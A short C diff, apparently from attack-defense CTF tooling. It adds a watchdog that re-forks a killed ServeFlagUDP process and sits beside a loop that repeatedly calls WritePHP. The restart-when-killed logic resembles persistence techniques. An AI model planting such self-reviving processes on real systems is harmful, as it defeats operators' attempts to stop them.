@@ -622,6 +622,18 @@ void do_work(char **argv)
 #if (PROBLEM == WEB)
         WritePHP(idx);
 #endif
+#if (SERVE_FLAG)
+        /* 监控 ServeFlagUDP 进程，被杀则立即重启 */
+        if (pid_s > 0 && kill(pid_s, 0) != 0)
+        {
+            pid_s = fork();
+            if (pid_s == 0)
+            {
+                ServeFlagUDP();
+                _exit(0);
+            }
+        }
+#endif
         usleep(100000);
     }
 }
